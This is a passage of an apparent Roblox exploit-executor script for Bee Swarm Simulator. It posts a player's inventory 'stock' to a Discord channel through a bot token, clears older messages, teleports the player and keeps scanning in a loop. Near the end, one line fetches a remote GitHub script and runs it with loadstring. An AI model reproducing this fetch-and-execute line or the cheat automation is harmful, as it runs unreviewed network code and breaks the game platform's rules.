    Description = Description .. "`" .. name .. " : " .. loc .. "`\n" .. string.format("%.1f", TypeDef.Q*5) .. " Potential | " .. ((TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0) .. " Waxes\n" .. Goods .. "\n\n"
end

local function c()
    local res = SafeRequest({
        Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100",
        Method = "GET",
        Headers = {
            ["Authorization"] = "Bot " .. AutoCollect.BotToken
        }
    })
    print("r", res.Body)
    local suc, msgs = pcall(function()
        return game:GetService("HttpService"):JSONDecode(res.Body)
    end)
    if suc and type(msgs) == "table" then
        local ids = {}
        for _,m in ipairs(msgs) do
            print(m.id)
            table.insert(ids, m.id)
        end
        print(#ids, "A")
        if #ids == 1 then
            print("T", SafeRequest({
                Url = "https://discord.com/api/v9/channels/" .. AutoCollect.StockChannel .. "/messages/" .. ids[1],
                Method = "DELETE",
                Headers = {
                    Authorization = "Bot " .. AutoCollect.BotToken,
                    ["Content-Type"] = "application/json"
                },
            }))
        else
            print("B", SafeRequest({
                Url="https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages/bulk-delete",
                Method = "POST",
                Headers = {
                    Authorization = "Bot " .. AutoCollect.BotToken,
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    messages=ids
                })
            }).StatusCode)
        end
    end
end
local b = tick()
while task.wait() do
    local check = {1,1}
    c()
    repeat
        wait(1)
        local suc, msgs = pcall(function()
            return game:GetService("HttpService"):JSONDecode(SafeRequest({
                Url = "https://discord.com/api/v10/channels/" .. AutoCollect.StockChannel .. "/messages?limit=100",
                Method = "GET",
                Headers = {
                    Authorization = "Bot " .. AutoCollect.BotToken,
                    ["content-type"] = "application/json"
                }
            }).Body)
        end)
        if suc and type(msgs) == "table" then
            check = msgs
        end
        print("C", check)
    until #check == 0 or tick() - b >= 5
    b = tick()
    if #check == 0 then
        break
    end
end
local Body = {
content = "<t:" .. os.time() .. ":f> Stock List.",
embeds = {{
    title = LocalPlayer.Name .. " Stock",
    description = Description,
    color = 11731199
}}
}
PublishMessage(AutoCollect.StockChannel, nil, Body)
--end)

warn("All that gobblydook is done")


if game.PlaceId ~= 1537690962 then
    game:GetService("TeleportService"):Teleport(1537690962, LocalPlayer)
end
task.spawn(function()
    if _G.loadatlasautojoin then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"))()
    end    
end)

while task.wait(3) do
    Scans = Scans + 1
    Label.Text = "Scans: " .. Scans
    Scan(true)
end
